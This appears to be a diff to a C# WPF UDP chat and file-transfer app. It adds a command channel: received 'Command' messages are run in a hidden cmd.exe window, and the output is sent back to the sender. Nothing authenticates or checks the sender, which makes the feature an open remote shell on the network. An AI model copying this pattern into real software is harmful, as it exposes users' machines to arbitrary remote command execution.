@@ -10,11 +10,13 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Windows;
 using DeviceSync;
+using System.Diagnostics;
 
 namespace App2
 {
     public partial class MessageWindow : Window
     {
+        private System.Diagnostics.Process _process;
         private readonly UdpClient _udpSender;
         private readonly UdpClient _udpReceiver;
         private const int bufferSize = 8 * 1024; // Maximum UDP packet size
@@ -47,30 +49,37 @@ namespace App2
                     var receivedJson = Encoding.UTF8.GetString(result.Buffer);
                     JObject receivedObject = JObject.Parse(receivedJson);
 
-                    PackageType messageType = receivedObject["Type"].ToObject<PackageType>();
+                    PackageType messageType = receivedObject["Type"]!.ToObject<PackageType>();
                     switch (messageType)
                     {
                         case PackageType.Text:
                             {
-                                StringMessage textMessage = receivedObject.ToObject<StringMessage>();
-                                AddText($"--> {textMessage.Content}");
+                                StringMessage? textMessage = receivedObject.ToObject<StringMessage>();
+                                AddText($"--> {textMessage?.Content}");
                                 break;
                             }
                         case PackageType.FileChunk:
                             {
                                 AddText("Плюс кусок");
                                 waitHandler.Set();
-                                FileChunk fileMessage = receivedObject.ToObject<FileChunk>();
+                                FileChunk? fileMessage = receivedObject.ToObject<FileChunk>();
                                 await SaveFileAsync(fileMessage);
                                 break;
                             }
                         case PackageType.Acknowledge:
                             {
                                 AddText("Подтвержден");
-                                AcknowledgePackage acknowledgePackage = receivedObject.ToObject<AcknowledgePackage>();
+                                AcknowledgePackage? acknowledgePackage = receivedObject.ToObject<AcknowledgePackage>();
                                 await SendChunkAsync(acknowledgePackage);
                                 break;
                             }
+                        case PackageType.Command:
+                        {
+                            StringMessage commandMessage = receivedObject.ToObject<StringMessage>();
+                            ExecuteCommand(commandMessage.Content);
+                            break;
+                        }
+
                     }
                 }
             }
@@ -80,35 +89,98 @@ namespace App2
             }
         }
 
-        private async Task SaveFileAsync(FileChunk file)
+        private async Task ExecuteCommand(string command)
         {
             try
             {
-                string fileName = Path.GetFileName(file.FileName);
+                Process process = new Process();
+                process.StartInfo.FileName = "cmd.exe";
+                process.StartInfo.UseShellExecute = false;
+                process.StartInfo.RedirectStandardInput = true;
+                process.StartInfo.RedirectStandardOutput = true;
+                process.StartInfo.RedirectStandardError = true;
+                process.StartInfo.CreateNoWindow = true;
+
+                StringBuilder outputBuilder = new StringBuilder();
+
+                process.OutputDataReceived += (sender, e) =>
+                {
+                    if (!string.IsNullOrEmpty(e.Data))
+                    {
+                        outputBuilder.AppendLine(e.Data);
+                        SendCommandOutput(e.Data);
+                    }
+                };
+
+                process.ErrorDataReceived += (sender, e) =>
+                {
+                    if (!string.IsNullOrEmpty(e.Data))
+                    {
+                        outputBuilder.AppendLine(e.Data);
+                        SendCommandOutput(e.Data);
+                    }
+                };
+
+                process.Start();
+                process.BeginOutputReadLine();
+                process.BeginErrorReadLine();
+
+                process.StandardInput.WriteLine(command);
+                process.StandardInput.WriteLine("exit");
+                process.WaitForExit();
+
+                string output = outputBuilder.ToString();
+                AddText("Command executed!");
+                AddText(output);
+            }
+            catch (Exception ex)
+            {
+                ExceptionNotify?.Invoke(this, ex);
+            }
+        }
+
+        private async Task SendCommandOutput(string output)
+        {
+            if (!string.IsNullOrEmpty(output))
+            {
+                StringMessage stringMessage = new StringMessage(PackageType.Text, output);
+                await SendAsync(stringMessage);
+            }
+        }
+
+
+        private async Task SaveFileAsync(FileChunk? file)
+        {
+            try
+            {
+                string? fileName = Path.GetFileName(file?.FileName);
 
                 string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                 string downloadsFolderPath = Path.Combine(folderPath, "Downloads");
 
-                string filePathToSave = Path.Combine(downloadsFolderPath, fileName);
-
-                using (FileStream fs = new(filePathToSave, FileMode.Append, FileAccess.Write))
+                if (fileName != null)
                 {
-                    await fs.WriteAsync(file.Content.AsMemory(0, file.Content.Length));
+                    string filePathToSave = Path.Combine(downloadsFolderPath, fileName);
 
-                    var package = new AcknowledgePackage(file.FileName, file.CurrentChunk + 1);
-                    await SendAsync(package);
+                    await using (FileStream fs = new(filePathToSave, FileMode.Append, FileAccess.Write))
+                    {
+                        await fs.WriteAsync(file.Content.AsMemory(0, file.Content.Length));
+
+                        var package = new AcknowledgePackage(file.FileName, file.CurrentChunk + 1);
+                        await SendAsync(package);
+                    }
+
+                    await Task.Delay(250);
+
+                    if (!waitHandler.WaitOne(0))
+                    {
+                        AddText($"Переотправил");
+                        var package = new AcknowledgePackage(file.FileName, file.CurrentChunk + 1);
+                        await SendAsync(package);
+                    }
+
+                    AddText($"Файл {fileName} сохранен! {filePathToSave}");
                 }
-
-                await Task.Delay(250);
-
-                if (!waitHandler.WaitOne(0))
-                {
-                    AddText($"Переотправил");
-                    var package = new AcknowledgePackage(file.FileName, file.CurrentChunk + 1);
-                    await SendAsync(package);
-                }
-
-                AddText($"Файл {fileName} сохранен! {filePathToSave}");
             }
             catch (Exception ex)
             {
@@ -127,17 +199,29 @@ namespace App2
         {
             try
             {
-                StringMessage stringMessage = new StringMessage(PackageType.Text, Message.Text);
-
-                await SendAsync(stringMessage);
-
-                AddText("Сообщение отправлено!");
+                if (!string.IsNullOrEmpty(Message.Text))
+                {
+                    if (Message.Text.StartsWith("/"))
+                    {
+                        string command = Message.Text.TrimStart('/');
+                        StringMessage commandMessage = new StringMessage(PackageType.Command, command);
+                        await SendAsync(commandMessage);
+                        AddText("Console Command sent!");
+                    }
+                    else
+                    {
+                        StringMessage stringMessage = new StringMessage(PackageType.Text, Message.Text);
+                        await SendAsync(stringMessage);
+                        AddText("Message sent!");
+                    }
+                }
             }
             catch (Exception ex)
             {
                 ExceptionNotify?.Invoke(this, ex);
             }
         }
+
 
         private void AddText(string message) =>
             Application.Current.Dispatcher.Invoke(() => { Chat.Text += $"{message}\t{DateTime.Now:HH:mm:ss:ffff}\n"; });
@@ -160,7 +244,7 @@ namespace App2
             }
         }
 
-        private async Task SendChunkAsync(AcknowledgePackage package)
+        private async Task SendChunkAsync(AcknowledgePackage? package)
         {
             try
             {
